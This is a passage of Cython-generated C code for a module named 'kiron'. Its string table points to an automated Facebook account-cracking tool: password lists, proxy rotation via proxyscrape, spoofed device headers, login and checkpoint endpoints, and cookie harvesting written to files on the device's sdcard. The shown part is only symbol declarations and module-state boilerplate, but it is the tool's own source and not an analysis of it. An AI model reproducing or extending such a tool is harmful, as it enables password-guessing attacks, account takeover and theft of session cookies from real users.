  PyObject *__pyx_kp_s_Vibe_K5_Plus_Dual_SIM;
  PyObject *__pyx_kp_s_Vibe_X;
  PyObject *__pyx_kp_s_Vibe_Z;
  PyObject *__pyx_n_s_Vision;
  PyObject *__pyx_kp_s_Vision_3_Dual_SIM;
  PyObject *__pyx_kp_s_Volt_LS740;
  PyObject *__pyx_kp_u_WOW64_AppleWebKit;
  PyObject *__pyx_n_s_X;
  PyObject *__pyx_n_s_X1;
  PyObject *__pyx_n_s_X2;
  PyObject *__pyx_n_s_X3;
  PyObject *__pyx_n_s_X4;
  PyObject *__pyx_n_s_X5;
  PyObject *__pyx_kp_s_XD;
  PyObject *__pyx_kp_s_XD_2;
  PyObject *__pyx_kp_u_XD_3;
  PyObject *__pyx_kp_s_X_FB_Connection_Bandwidth;
  PyObject *__pyx_kp_s_X_FB_Connection_Type;
  PyObject *__pyx_kp_s_X_FB_Friendly_Name;
  PyObject *__pyx_kp_s_X_FB_HTTP_Engine;
  PyObject *__pyx_kp_s_X_FB_Net_HNI;
  PyObject *__pyx_kp_s_X_FB_SIM_HNI;
  PyObject *__pyx_n_s_Y;
  PyObject *__pyx_n_s_Y21;
  PyObject *__pyx_n_s_Y21L;
  PyObject *__pyx_n_s_Y28;
  PyObject *__pyx_kp_s_Y336_U02;
  PyObject *__pyx_kp_s_Y3_2018;
  PyObject *__pyx_n_s_Y51;
  PyObject *__pyx_n_s_Y51L;
  PyObject *__pyx_n_s_Y55L;
  PyObject *__pyx_kp_s_Y5_Dual_SIM_2017;
  PyObject *__pyx_kp_s_Y5_II;
  PyObject *__pyx_kp_s_Y5_Prime_2018_Dual_SIM;
  PyObject *__pyx_n_s_Y65;
  PyObject *__pyx_n_s_Y66;
  PyObject *__pyx_n_s_Y69;
  PyObject *__pyx_kp_s_Y6_2018;
  PyObject *__pyx_kp_s_Y6_Dual_SIM_2018;
  PyObject *__pyx_kp_s_Y6_Prime_2018;
  PyObject *__pyx_n_s_Y71;
  PyObject *__pyx_n_s_Y81;
  PyObject *__pyx_n_s_Y83;
  PyObject *__pyx_kp_s_YP_GI1;
  PyObject *__pyx_kp_u_YaApp_Android;
  PyObject *__pyx_kp_s_YaBrowser;
  PyObject *__pyx_n_s_Yes;
  PyObject *__pyx_kp_s_Yota_Phone_2;
  PyObject *__pyx_n_s_Zong;
  PyObject *__pyx_kp_s__11;
  PyObject *__pyx_kp_u__11;
  PyObject *__pyx_kp_s__119;
  PyObject *__pyx_kp_s__124;
  PyObject *__pyx_n_s__160;
  PyObject *__pyx_kp_s__25;
  PyObject *__pyx_kp_u__25;
  PyObject *__pyx_kp_s__32;
  PyObject *__pyx_kp_s__33;
  PyObject *__pyx_kp_s__38;
  PyObject *__pyx_kp_u__38;
  PyObject *__pyx_kp_u__48;
  PyObject *__pyx_kp_u__54;
  PyObject *__pyx_kp_s__63;
  PyObject *__pyx_kp_u__63;
  PyObject *__pyx_kp_s__71;
  PyObject *__pyx_kp_u__71;
  PyObject *__pyx_kp_s__72;
  PyObject *__pyx_kp_s__74;
  PyObject *__pyx_n_s__75;
  PyObject *__pyx_kp_s__77;
  PyObject *__pyx_kp_s__83;
  PyObject *__pyx_kp_u__84;
  PyObject *__pyx_kp_u__85;
  PyObject *__pyx_kp_s__88;
  PyObject *__pyx_n_s__93;
  PyObject *__pyx_n_s_a;
  PyObject *__pyx_n_s_aV;
  PyObject *__pyx_n_s_accept;
  PyObject *__pyx_kp_s_accept_language;
  PyObject *__pyx_n_s_accessToken;
  PyObject *__pyx_n_s_adid;
  PyObject *__pyx_n_s_advertiser_id;
  PyObject *__pyx_n_s_allow_redirects;
  PyObject *__pyx_n_s_android_version;
  PyObject *__pyx_n_s_api1;
  PyObject *__pyx_n_s_api1_locals_genexpr;
  PyObject *__pyx_n_s_api2;
  PyObject *__pyx_n_s_api2_locals_genexpr;
  PyObject *__pyx_n_s_append;
  PyObject *__pyx_kp_s_application_x_www_form_urlencode;
  PyObject *__pyx_n_s_approval;
  PyObject *__pyx_n_s_args;
  PyObject *__pyx_n_s_ask;
  PyObject *__pyx_n_s_asyncio_coroutines;
  PyObject *__pyx_n_s_authenticate;
  PyObject *__pyx_n_s_authority;
  PyObject *__pyx_n_s_b64encode;
  PyObject *__pyx_n_s_bV;
  PyObject *__pyx_n_s_base64;
  PyObject *__pyx_n_s_bbbb;
  PyObject *__pyx_n_s_bln;
  PyObject *__pyx_n_s_br_virshon;
  PyObject *__pyx_n_s_build;
  PyObject *__pyx_n_s_button_with_disabled;
  PyObject *__pyx_n_s_bx;
  PyObject *__pyx_n_s_bz;
  PyObject *__pyx_n_s_cV;
  PyObject *__pyx_n_s_c_user;
  PyObject *__pyx_kp_s_c_user_xs;
  PyObject *__pyx_kp_s_cache_control;
  PyObject *__pyx_kp_s_cell_CTRadioAccessTechnologyHSDP;
  PyObject *__pyx_n_s_check_output;
  PyObject *__pyx_n_s_checkpoint;
  PyObject *__pyx_n_s_choice;
  PyObject *__pyx_n_s_choices;
  PyObject *__pyx_n_s_chorom;
  PyObject *__pyx_n_s_ckk;
  PyObject *__pyx_n_s_class_getitem;
  PyObject *__pyx_n_s_clear;
  PyObject *__pyx_n_s_client_country_code;
  PyObject *__pyx_n_s_cline_in_traceback;
  PyObject *__pyx_n_s_close;
  PyObject *__pyx_n_s_code;
  PyObject *__pyx_n_s_coki;
  PyObject *__pyx_kp_s_com_facebook_account_login_proto;
  PyObject *__pyx_kp_s_com_facebook_katana;
  PyObject *__pyx_n_s_community_id;
  PyObject *__pyx_n_s_concurrent_futures;
  PyObject *__pyx_kp_s_content_type;
  PyObject *__pyx_n_s_cookies;
  PyObject *__pyx_n_s_cph;
  PyObject *__pyx_n_s_cpl;
  PyObject *__pyx_n_s_cps;
  PyObject *__pyx_n_s_crack_submit;
  PyObject *__pyx_n_s_credentials_type;
  PyObject *__pyx_kp_s_credentials_type_device_based_l;
  PyObject *__pyx_n_s_crk;
  PyObject *__pyx_n_s_cudiua1;
  PyObject *__pyx_n_s_cudiua2;
  PyObject *__pyx_n_s_cudiua3;
  PyObject *__pyx_n_s_cudiua4;
  PyObject *__pyx_n_s_cudiua5;
  PyObject *__pyx_n_s_cudiua6;
  PyObject *__pyx_n_s_cudiua7;
  PyObject *__pyx_n_s_cudiua8;
  PyObject *__pyx_n_s_currently_logged_in_userid;
  PyObject *__pyx_n_s_cx;
  PyObject *__pyx_n_s_cz;
  PyObject *__pyx_n_s_data;
  PyObject *__pyx_kp_s_data_data_com_termux_files_usr;
  PyObject *__pyx_n_s_date;
  PyObject *__pyx_n_s_datetime;
  PyObject *__pyx_n_s_day;
  PyObject *__pyx_n_s_decode;
  PyObject *__pyx_kp_s_density_2_25_height;
  PyObject *__pyx_n_s_device;
  PyObject *__pyx_n_s_device_id;
  PyObject *__pyx_n_s_dic;
  PyObject *__pyx_n_s_dic2;
  PyObject *__pyx_n_s_digits;
  PyObject *__pyx_kp_u_disable;
  PyObject *__pyx_n_s_document;
  PyObject *__pyx_n_s_dpr;
  PyObject *__pyx_n_s_e;
  PyObject *__pyx_n_s_email;
  PyObject *__pyx_kp_s_en_BD_en_GB_q_0_9_en_US_q_0_8_en;
  PyObject *__pyx_n_s_en_GB;
  PyObject *__pyx_kp_u_enable;
  PyObject *__pyx_n_s_enroll_misauth;
  PyObject *__pyx_n_s_enter;
  PyObject *__pyx_n_s_error;
  PyObject *__pyx_n_s_error_detail_type;
  PyObject *__pyx_n_s_error_msg;
  PyObject *__pyx_n_s_exceptions;
  PyObject *__pyx_n_s_exit;
  PyObject *__pyx_n_s_exit_2;
  PyObject *__pyx_n_s_false;
  PyObject *__pyx_n_s_family;
  PyObject *__pyx_n_s_family_device_id;
  PyObject *__pyx_n_s_fb_api_caller_class;
  PyObject *__pyx_n_s_fb_api_req_friendly_name;
  PyObject *__pyx_n_s_fban;
  PyObject *__pyx_n_s_fbav;
  PyObject *__pyx_n_s_fbbd;
  PyObject *__pyx_n_s_fbbv;
  PyObject *__pyx_n_s_fbca;
  PyObject *__pyx_n_s_fbcr;
  PyObject *__pyx_n_s_fbdm;
  PyObject *__pyx_n_s_fbdv;
  PyObject *__pyx_n_s_fbfw;
  PyObject *__pyx_n_s_fblc;
  PyObject *__pyx_n_s_fbmf;
  PyObject *__pyx_n_s_fbpn;
  PyObject *__pyx_n_s_fbrv;
  PyObject *__pyx_n_s_fbsv;
  PyObject *__pyx_n_s_file;
  PyObject *__pyx_n_s_findall;
  PyObject *__pyx_n_s_first;
  PyObject *__pyx_n_s_flush;
  PyObject *__pyx_n_s_fn;
  PyObject *__pyx_n_s_fo;
  PyObject *__pyx_n_s_format;
  PyObject *__pyx_n_s_free_fb;
  PyObject *__pyx_kp_u_gc;
  PyObject *__pyx_n_s_generate_analytics_claims;
  PyObject *__pyx_n_s_generate_machine_id;
  PyObject *__pyx_n_s_generate_session_cookies;
  PyObject *__pyx_n_s_genexpr;
  PyObject *__pyx_n_s_get;
  PyObject *__pyx_n_s_get_dict;
  PyObject *__pyx_kp_s_getprop_gsm_operator_alpha;
  PyObject *__pyx_kp_s_getprop_ro_build_id;
  PyObject *__pyx_kp_s_getprop_ro_build_version_release;
  PyObject *__pyx_kp_s_getprop_ro_hwui_text_large_cache;
  PyObject *__pyx_kp_s_getprop_ro_hwui_text_large_cache_2;
  PyObject *__pyx_kp_s_getprop_ro_product_brand;
  PyObject *__pyx_kp_s_getprop_ro_product_cpu_abilist;
  PyObject *__pyx_kp_s_getprop_ro_product_manufacturer;
  PyObject *__pyx_kp_s_getprop_ro_product_model;
  PyObject *__pyx_n_s_getuid;
  PyObject *__pyx_n_s_group;
  PyObject *__pyx_kp_s_gzip_deflate;
  PyObject *__pyx_n_s_hash_id;
  PyObject *__pyx_n_s_hashlib;
  PyObject *__pyx_n_s_head;
  PyObject *__pyx_n_s_headers;
  PyObject *__pyx_n_s_hexdigits;
  PyObject *__pyx_n_s_https;
  PyObject *__pyx_kp_s_https_api_facebook_com_method_au;
  PyObject *__pyx_kp_s_https_api_proxyscrape_com_reques;
  PyObject *__pyx_kp_s_https_api_proxyscrape_com_v2_req;
  PyObject *__pyx_kp_s_https_fgsrsvb_blogspot_com_2024;
  PyObject *__pyx_kp_u_https_graph_facebook_com;
  PyObject *__pyx_kp_s_https_graph_facebook_com_auth_lo;
  PyObject *__pyx_kp_s_https_graph_facebook_com_method;
  PyObject *__pyx_kp_s_https_mbasic_facebook_com;
  PyObject *__pyx_kp_s_https_mbasic_facebook_com_login;
  PyObject *__pyx_kp_s_https_raw_githubusercontent_com;
  PyObject *__pyx_n_s_httpx;
  PyObject *__pyx_n_s_i;
  PyObject *__pyx_n_s_id;
  PyObject *__pyx_n_s_idpaslogin;
  PyObject *__pyx_n_s_ids;
  PyObject *__pyx_n_s_import;
  PyObject *__pyx_n_s_initializing;
  PyObject *__pyx_n_s_input;
  PyObject *__pyx_n_s_is_coroutine;
  PyObject *__pyx_kp_u_isenabled;
  PyObject *__pyx_n_s_items;
  PyObject *__pyx_n_s_j1;
  PyObject *__pyx_n_s_jazoest;
  PyObject *__pyx_n_s_join;
  PyObject *__pyx_n_s_json;
  PyObject *__pyx_n_s_k;
  PyObject *__pyx_n_s_key;
  PyObject *__pyx_n_s_keys;
  PyObject *__pyx_n_s_kiron;
  PyObject *__pyx_n_s_kkkkki;
  PyObject *__pyx_n_s_last;
  PyObject *__pyx_n_s_li;
  PyObject *__pyx_n_s_li2;
  PyObject *__pyx_n_s_light;
  PyObject *__pyx_n_s_limit;
  PyObject *__pyx_n_s_linex;
  PyObject *__pyx_n_s_ln;
  PyObject *__pyx_n_s_locale;
  PyObject *__pyx_n_s_localtime;
  PyObject *__pyx_n_s_log_cookies;
  PyObject *__pyx_n_s_logged_out_id;
  PyObject *__pyx_n_s_login;
  PyObject *__pyx_n_s_logo;
  PyObject *__pyx_n_s_loop;
  PyObject *__pyx_n_s_love;
  PyObject *__pyx_n_s_lower;
  PyObject *__pyx_n_s_lsd;
  PyObject *__pyx_n_s_lt;
  PyObject *__pyx_n_s_ltx;
  PyObject *__pyx_n_s_m_ts;
  PyObject *__pyx_n_s_main;
  PyObject *__pyx_n_s_mal;
  PyObject *__pyx_n_s_math;
  PyObject *__pyx_kp_s_max_age_0;
  PyObject *__pyx_n_s_max_workers;
  PyObject *__pyx_kp_s_mbasic_facebook_com;
  PyObject *__pyx_n_s_menu;
  PyObject *__pyx_n_s_message;
  PyObject *__pyx_n_s_meta_inf_fbmeta;
  PyObject *__pyx_n_s_method;
  PyObject *__pyx_n_s_mkdir;
  PyObject *__pyx_n_s_mmm;
  PyObject *__pyx_n_s_mmmm;
  PyObject *__pyx_n_s_mmmmm;
  PyObject *__pyx_n_s_mmp;
  PyObject *__pyx_n_s_mobile;
  PyObject *__pyx_kp_s_mod_txt;
  PyObject *__pyx_n_s_model;
  PyObject *__pyx_n_s_moe;
  PyObject *__pyx_n_s_month;
  PyObject *__pyx_n_s_motorola;
  PyObject *__pyx_n_s_mthd;
  PyObject *__pyx_n_s_n;
  PyObject *__pyx_n_s_name;
  PyObject *__pyx_n_s_name_2;
  PyObject *__pyx_kp_s_name_jazoest_value;
  PyObject *__pyx_kp_s_name_li_value;
  PyObject *__pyx_kp_s_name_lsd_value;
  PyObject *__pyx_kp_s_name_m_ts_value;
  PyObject *__pyx_n_s_names;
  PyObject *__pyx_n_s_navigate;
  PyObject *__pyx_n_s_network_country;
  PyObject *__pyx_n_s_none;
  PyObject *__pyx_n_s_now;
  PyObject *__pyx_n_s_oks;
  PyObject *__pyx_n_s_old;
  PyObject *__pyx_n_s_open;
  PyObject *__pyx_n_s_os;
  PyObject *__pyx_n_s_pas;
  PyObject *__pyx_n_s_pass;
  PyObject *__pyx_n_s_passlist;
  PyObject *__pyx_kp_s_password;
  PyObject *__pyx_n_s_password_2;
  PyObject *__pyx_n_s_path;
  PyObject *__pyx_n_s_pcp;
  PyObject *__pyx_kp_u_picture_type_normal;
  PyObject *__pyx_n_s_pip;
  PyObject *__pyx_kp_s_pip_install_requests_futures_2_d;
  PyObject *__pyx_n_s_platform;
  PyObject *__pyx_n_s_plist;
  PyObject *__pyx_n_s_po;
  PyObject *__pyx_n_s_post;
  PyObject *__pyx_n_s_print;
  PyObject *__pyx_n_s_proxsi;
  PyObject *__pyx_kp_s_proxy_txt;
  PyObject *__pyx_n_s_proxylist;
  PyObject *__pyx_n_s_ps;
  PyObject *__pyx_n_s_ps_limit;
  PyObject *__pyx_n_s_pw;
  PyObject *__pyx_kp_s_python_AYYUB_py;
  PyObject *__pyx_n_s_r;
  PyObject *__pyx_n_s_randint;
  PyObject *__pyx_n_s_random;
  PyObject *__pyx_n_s_random_seed;
  PyObject *__pyx_n_s_randrange;
  PyObject *__pyx_n_s_range;
  PyObject *__pyx_n_s_rc;
  PyObject *__pyx_n_s_re;
  PyObject *__pyx_n_s_read;
  PyObject *__pyx_n_s_redmi;
  PyObject *__pyx_n_s_reg_instance;
  PyObject *__pyx_n_s_regular;
  PyObject *__pyx_n_s_replace;
  PyObject *__pyx_n_s_requests;
  PyObject *__pyx_n_s_res;
  PyObject *__pyx_n_s_resrr;
  PyObject *__pyx_n_s_ress;
  PyObject *__pyx_n_s_rnd;
  PyObject *__pyx_n_s_rp;
  PyObject *__pyx_n_s_rr;
  PyObject *__pyx_n_s_scheme;
  PyObject *__pyx_kp_s_sdcard_AYYUB;
  PyObject *__pyx_kp_s_sdcard_AYYUB_CP_txt;
  PyObject *__pyx_kp_s_sdcard_AYYUB_FILE_M1_OK_txt;
  PyObject *__pyx_kp_s_sdcard_AYYUB_FILE_M2_OK_txt;
  PyObject *__pyx_kp_s_sdcard_AYYUB_OLD_txt;
  PyObject *__pyx_kp_s_sdcard_AYYUB_RND_CP_txt;
  PyObject *__pyx_kp_s_sdcard_AYYUB_RND_M1_OK_COKIE_tx;
  PyObject *__pyx_kp_s_sdcard_kiron_py;
  PyObject *__pyx_n_s_se;
  PyObject *__pyx_n_s_search;
  PyObject *__pyx_kp_s_sec_ch_prefers_color_scheme;
  PyObject *__pyx_kp_s_sec_ch_ua;
  PyObject *__pyx_kp_s_sec_ch_ua_full_version_list;
  PyObject *__pyx_kp_s_sec_ch_ua_mobile;
  PyObject *__pyx_kp_s_sec_ch_ua_platform;
  PyObject *__pyx_kp_s_sec_fetch_dest;
  PyObject *__pyx_kp_s_sec_fetch_mode;
  PyObject *__pyx_kp_s_sec_fetch_site;
  PyObject *__pyx_kp_s_sec_fetch_user;
  PyObject *__pyx_n_s_secure;
  PyObject *__pyx_n_s_select;
  PyObject *__pyx_n_s_send;
  PyObject *__pyx_n_s_ses;
  PyObject *__pyx_n_s_session;
  PyObject *__pyx_n_s_session_cookies;
  PyObject *__pyx_n_s_session_id;
  PyObject *__pyx_n_s_session_key;
  PyObject *__pyx_kp_s_sessions_py;
  PyObject *__pyx_n_s_sexkey;
  PyObject *__pyx_n_s_shell;
  PyObject *__pyx_n_s_sim_country;
  PyObject *__pyx_n_s_sim_id;
  PyObject *__pyx_n_s_sim_serials;
  PyObject *__pyx_n_s_sleep;
  PyObject *__pyx_n_s_smtplib;
  PyObject *__pyx_kp_s_socksku_txt;
  PyObject *__pyx_n_s_source;
  PyObject *__pyx_n_s_spec;
  PyObject *__pyx_n_s_split;
  PyObject *__pyx_n_s_splitlines;
  PyObject *__pyx_n_s_ssbb;
  PyObject *__pyx_n_s_star;
  PyObject *__pyx_n_s_stdout;
  PyObject *__pyx_n_s_string;
  PyObject *__pyx_n_s_submit;
  PyObject *__pyx_n_s_subprocess;
  PyObject *__pyx_kp_u_swan_mibrowser;
  PyObject *__pyx_n_s_sys;
  PyObject *__pyx_n_s_system;
  PyObject *__pyx_n_s_tag;
  PyObject *__pyx_n_s_test;
  PyObject *__pyx_n_s_text;
  PyObject *__pyx_kp_s_text_html_application_xhtml_xml;
  PyObject *__pyx_n_s_tgl;
  PyObject *__pyx_n_s_thn;
  PyObject *__pyx_n_s_throw;
  PyObject *__pyx_n_s_tier;
  PyObject *__pyx_n_s_time;
  PyObject *__pyx_n_s_tks;
  PyObject *__pyx_n_s_tl;
  PyObject *__pyx_n_s_tokenku;
  PyObject *__pyx_n_s_total;
  PyObject *__pyx_n_s_total_ids;
  PyObject *__pyx_n_s_tred;
  PyObject *__pyx_n_s_true;
  PyObject *__pyx_n_s_try_num;
  PyObject *__pyx_n_s_try_number;
  PyObject *__pyx_n_s_twf;
  PyObject *__pyx_n_s_ua;
  PyObject *__pyx_n_s_uid;
  PyObject *__pyx_n_s_uidx;
  PyObject *__pyx_n_s_unknown;
  PyObject *__pyx_n_s_uno;
  PyObject *__pyx_n_s_unrecognized_tries;
  PyObject *__pyx_kp_s_upgrade_insecure_requests;
  PyObject *__pyx_n_s_urandom;
  PyObject *__pyx_n_s_url;
  PyObject *__pyx_n_s_urllib;
  PyObject *__pyx_n_s_urllib3;
  PyObject *__pyx_n_s_urllib_request;
  PyObject *__pyx_n_s_urlopen;
  PyObject *__pyx_n_s_us;
  PyObject *__pyx_n_s_user;
  PyObject *__pyx_kp_s_user_agent;
  PyObject *__pyx_n_s_usergent;
  PyObject *__pyx_kp_s_utf_8;
  PyObject *__pyx_n_s_uuid;
  PyObject *__pyx_n_s_uuid4;
  PyObject *__pyx_n_s_value;
  PyObject *__pyx_n_s_verify;
  PyObject *__pyx_kp_s_viewport_width;
  PyObject *__pyx_n_s_w;
  PyObject *__pyx_kp_s_width;
  PyObject *__pyx_n_s_windows;
  PyObject *__pyx_n_s_write;
  PyObject *__pyx_kp_s_www_facebook_com;
  PyObject *__pyx_n_s_x;
  PyObject *__pyx_kp_s_x_fb_connection_bandwidth;
  PyObject *__pyx_kp_s_x_fb_connection_quality;
  PyObject *__pyx_kp_s_x_fb_connection_type;
  PyObject *__pyx_kp_s_x_fb_http_engine;
  PyObject *__pyx_kp_s_x_fb_net_hni;
  PyObject *__pyx_kp_s_x_fb_sim_hni;
  PyObject *__pyx_n_s_xd;
  PyObject *__pyx_kp_s_xdg_open_https_wa_me_88019097655;
  PyObject *__pyx_kp_s_xdg_open_https_www_facebook_com;
  PyObject *__pyx_n_s_y;
  PyObject *__pyx_n_s_year;
  PyObject *__pyx_n_s_yes;
  PyObject *__pyx_n_s_zlib;
  PyObject *__pyx_float_2e7;
  PyObject *__pyx_float_3e7;
  PyObject *__pyx_float_20000000_0;
  PyObject *__pyx_float_30000000_0;
  PyObject *__pyx_int_0;
  PyObject *__pyx_int_1;
  PyObject *__pyx_int_2;
  PyObject *__pyx_int_3;
  PyObject *__pyx_int_4;
  PyObject *__pyx_int_5;
  PyObject *__pyx_int_6;
  PyObject *__pyx_int_7;
  PyObject *__pyx_int_8;
  PyObject *__pyx_int_9;
  PyObject *__pyx_int_10;
  PyObject *__pyx_int_11;
  PyObject *__pyx_int_12;
  PyObject *__pyx_int_13;
  PyObject *__pyx_int_16;
  PyObject *__pyx_int_17;
  PyObject *__pyx_int_18;
  PyObject *__pyx_int_19;
  PyObject *__pyx_int_20;
  PyObject *__pyx_int_30;
  PyObject *__pyx_int_34;
  PyObject *__pyx_int_36;
  PyObject *__pyx_int_38;
  PyObject *__pyx_int_39;
  PyObject *__pyx_int_40;
  PyObject *__pyx_int_42;
  PyObject *__pyx_int_44;
  PyObject *__pyx_int_49;
  PyObject *__pyx_int_59;
  PyObject *__pyx_int_77;
  PyObject *__pyx_int_89;
  PyObject *__pyx_int_99;
  PyObject *__pyx_int_110;
  PyObject *__pyx_int_111;
  PyObject *__pyx_int_120;
  PyObject *__pyx_int_311;
  PyObject *__pyx_int_499;
  PyObject *__pyx_int_511;
  PyObject *__pyx_int_552;
  PyObject *__pyx_int_599;
  PyObject *__pyx_int_661;
  PyObject *__pyx_int_742;
  PyObject *__pyx_int_999;
  PyObject *__pyx_int_1111;
  PyObject *__pyx_int_2200;
  PyObject *__pyx_int_7120;
  PyObject *__pyx_int_7999;
  PyObject *__pyx_int_9999;
  PyObject *__pyx_int_11111;
  PyObject *__pyx_int_20000;
  PyObject *__pyx_int_40000;
  PyObject *__pyx_int_66666;
  PyObject *__pyx_int_99999;
  PyObject *__pyx_int_111111;
  PyObject *__pyx_int_199999;
  PyObject *__pyx_int_900000;
  PyObject *__pyx_int_999999;
  PyObject *__pyx_int_1111111;
  PyObject *__pyx_int_7777777;
  PyObject *__pyx_int_20000000;
  PyObject *__pyx_int_30000000;
  PyObject *__pyx_int_100000000;
  PyObject *__pyx_int_111111111;
  PyObject *__pyx_int_999999999;
  PyObject *__pyx_int_1000000000;
  PyObject *__pyx_int_9999999999;
  PyObject *__pyx_tuple_;
  PyObject *__pyx_tuple__2;
  PyObject *__pyx_tuple__3;
  PyObject *__pyx_tuple__4;
  PyObject *__pyx_tuple__5;
  PyObject *__pyx_tuple__6;
  PyObject *__pyx_tuple__7;
  PyObject *__pyx_tuple__8;
  PyObject *__pyx_tuple__9;
  PyObject *__pyx_slice__65;
  PyObject *__pyx_slice__66;
  PyObject *__pyx_slice__67;
  PyObject *__pyx_tuple__10;
  PyObject *__pyx_tuple__12;
  PyObject *__pyx_tuple__13;
  PyObject *__pyx_tuple__14;
  PyObject *__pyx_tuple__15;
  PyObject *__pyx_tuple__16;
  PyObject *__pyx_tuple__17;
  PyObject *__pyx_tuple__18;
  PyObject *__pyx_tuple__19;
  PyObject *__pyx_tuple__20;
  PyObject *__pyx_tuple__21;
  PyObject *__pyx_tuple__22;
  PyObject *__pyx_tuple__23;
  PyObject *__pyx_tuple__24;
  PyObject *__pyx_tuple__26;
  PyObject *__pyx_tuple__27;
  PyObject *__pyx_tuple__28;
  PyObject *__pyx_tuple__29;
  PyObject *__pyx_tuple__30;
  PyObject *__pyx_tuple__31;
  PyObject *__pyx_tuple__34;
  PyObject *__pyx_tuple__35;
  PyObject *__pyx_tuple__36;
  PyObject *__pyx_tuple__37;
  PyObject *__pyx_tuple__39;
  PyObject *__pyx_tuple__40;
  PyObject *__pyx_tuple__41;
  PyObject *__pyx_tuple__42;
  PyObject *__pyx_tuple__43;
  PyObject *__pyx_tuple__44;
  PyObject *__pyx_tuple__45;
  PyObject *__pyx_tuple__46;
  PyObject *__pyx_tuple__47;
  PyObject *__pyx_tuple__49;
  PyObject *__pyx_tuple__50;
  PyObject *__pyx_tuple__51;
  PyObject *__pyx_tuple__52;
  PyObject *__pyx_tuple__53;
  PyObject *__pyx_tuple__55;
  PyObject *__pyx_tuple__56;
  PyObject *__pyx_tuple__57;
  PyObject *__pyx_tuple__58;
  PyObject *__pyx_tuple__59;
  PyObject *__pyx_tuple__60;
  PyObject *__pyx_tuple__61;
  PyObject *__pyx_tuple__62;
  PyObject *__pyx_tuple__64;
  PyObject *__pyx_tuple__68;
  PyObject *__pyx_tuple__69;
  PyObject *__pyx_tuple__70;
  PyObject *__pyx_tuple__73;
  PyObject *__pyx_tuple__76;
  PyObject *__pyx_tuple__78;
  PyObject *__pyx_tuple__79;
  PyObject *__pyx_tuple__80;
  PyObject *__pyx_tuple__81;
  PyObject *__pyx_tuple__82;
  PyObject *__pyx_tuple__86;
  PyObject *__pyx_tuple__87;
  PyObject *__pyx_tuple__89;
  PyObject *__pyx_tuple__90;
  PyObject *__pyx_tuple__91;
  PyObject *__pyx_tuple__92;
  PyObject *__pyx_tuple__94;
  PyObject *__pyx_tuple__96;
  PyObject *__pyx_tuple__97;
  PyObject *__pyx_tuple__98;
  PyObject *__pyx_tuple__99;
  PyObject *__pyx_tuple__100;
  PyObject *__pyx_tuple__101;
  PyObject *__pyx_tuple__102;
  PyObject *__pyx_tuple__103;
  PyObject *__pyx_tuple__104;
  PyObject *__pyx_tuple__105;
  PyObject *__pyx_tuple__106;
  PyObject *__pyx_tuple__107;
  PyObject *__pyx_tuple__108;
  PyObject *__pyx_tuple__109;
  PyObject *__pyx_tuple__110;
  PyObject *__pyx_tuple__111;
  PyObject *__pyx_tuple__112;
  PyObject *__pyx_tuple__113;
  PyObject *__pyx_tuple__114;
  PyObject *__pyx_tuple__115;
  PyObject *__pyx_tuple__116;
  PyObject *__pyx_tuple__117;
  PyObject *__pyx_tuple__118;
  PyObject *__pyx_tuple__120;
  PyObject *__pyx_tuple__121;
  PyObject *__pyx_tuple__122;
  PyObject *__pyx_tuple__123;
  PyObject *__pyx_tuple__125;
  PyObject *__pyx_tuple__126;
  PyObject *__pyx_tuple__127;
  PyObject *__pyx_tuple__128;
  PyObject *__pyx_tuple__129;
  PyObject *__pyx_tuple__130;
  PyObject *__pyx_tuple__133;
  PyObject *__pyx_tuple__136;
  PyObject *__pyx_tuple__138;
  PyObject *__pyx_tuple__140;
  PyObject *__pyx_tuple__142;
  PyObject *__pyx_tuple__144;
  PyObject *__pyx_tuple__146;
  PyObject *__pyx_tuple__147;
  PyObject *__pyx_tuple__148;
  PyObject *__pyx_tuple__149;
  PyObject *__pyx_tuple__151;
  PyObject *__pyx_tuple__153;
  PyObject *__pyx_tuple__155;
  PyObject *__pyx_tuple__157;
  PyObject *__pyx_codeobj__95;
  PyObject *__pyx_codeobj__131;
  PyObject *__pyx_codeobj__132;
  PyObject *__pyx_codeobj__134;
  PyObject *__pyx_codeobj__135;
  PyObject *__pyx_codeobj__137;
  PyObject *__pyx_codeobj__139;
  PyObject *__pyx_codeobj__141;
  PyObject *__pyx_codeobj__143;
  PyObject *__pyx_codeobj__145;
  PyObject *__pyx_codeobj__150;
  PyObject *__pyx_codeobj__152;
  PyObject *__pyx_codeobj__154;
  PyObject *__pyx_codeobj__156;
  PyObject *__pyx_codeobj__158;
  PyObject *__pyx_codeobj__159;
} __pyx_mstate;

#if CYTHON_USE_MODULE_STATE
#ifdef __cplusplus
namespace {
  extern struct PyModuleDef __pyx_moduledef;
} /* anonymous namespace */
#else
static struct PyModuleDef __pyx_moduledef;
#endif

#define __pyx_mstate(o) ((__pyx_mstate *)__Pyx_PyModule_GetState(o))

#define __pyx_mstate_global (__pyx_mstate(PyState_FindModule(&__pyx_moduledef)))

#define __pyx_m (PyState_FindModule(&__pyx_moduledef))
#else
static __pyx_mstate __pyx_mstate_global_static =
#ifdef __cplusplus
    {};
#else
    {0};
#endif
static __pyx_mstate *__pyx_mstate_global = &__pyx_mstate_global_static;
#endif
/* #### Code section: module_state_clear ### */
#if CYTHON_USE_MODULE_STATE
static int __pyx_m_clear(PyObject *m) {
  __pyx_mstate *clear_module_state = __pyx_mstate(m);
  if (!clear_module_state) return 0;
  Py_CLEAR(clear_module_state->__pyx_d);
  Py_CLEAR(clear_module_state->__pyx_b);
  Py_CLEAR(clear_module_state->__pyx_cython_runtime);
  Py_CLEAR(clear_module_state->__pyx_empty_tuple);
  Py_CLEAR(clear_module_state->__pyx_empty_bytes);
  Py_CLEAR(clear_module_state->__pyx_empty_unicode);
  #ifdef __Pyx_CyFunction_USED
  Py_CLEAR(clear_module_state->__pyx_CyFunctionType);
  #endif
  #ifdef __Pyx_FusedFunction_USED
  Py_CLEAR(clear_module_state->__pyx_FusedFunctionType);
  #endif
  Py_CLEAR(clear_module_state->__pyx_ptype_5kiron___pyx_scope_struct__genexpr);
  Py_CLEAR(clear_module_state->__pyx_type_5kiron___pyx_scope_struct__genexpr);
  Py_CLEAR(clear_module_state->__pyx_ptype_5kiron___pyx_scope_struct_1_genexpr);
  Py_CLEAR(clear_module_state->__pyx_type_5kiron___pyx_scope_struct_1_genexpr);
  Py_CLEAR(clear_module_state->__pyx_ptype_5kiron___pyx_scope_struct_2_genexpr);
  Py_CLEAR(clear_module_state->__pyx_type_5kiron___pyx_scope_struct_2_genexpr);
  Py_CLEAR(clear_module_state->__pyx_ptype_5kiron___pyx_scope_struct_3_genexpr);
  Py_CLEAR(clear_module_state->__pyx_type_5kiron___pyx_scope_struct_3_genexpr);
